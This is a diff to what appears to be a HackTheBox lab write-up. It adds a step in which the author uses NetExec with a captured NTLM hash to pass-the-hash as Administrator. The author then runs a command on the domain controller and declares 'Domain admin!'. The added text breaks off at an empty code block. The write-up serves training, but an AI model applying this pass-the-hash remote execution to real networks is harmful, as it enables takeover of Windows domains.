@@ -588,7 +588,21 @@ SMB         10.129.81.48    445    DC01             [*] Windows 11 / Server 2025
 SMB         10.129.81.48    445    DC01             [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
 ```
 
-I 
+I have now compromised the DA
+
+```python
+❯❯❯ nxc smb dc01.checkpoint.htb -u 'Administrator' -H 'f29e9c014295b9b32139b09a2790be3b' -X whoami
+SMB         10.129.81.48    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.81.48    445    DC01             [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
+SMB         10.129.81.48    445    DC01             [+] Executed command via wmiexec
+SMB         10.129.81.48    445    DC01             checkpoint\administrator
+```
+
+Domain admin!
+
+```python
+
+```
 
 
 
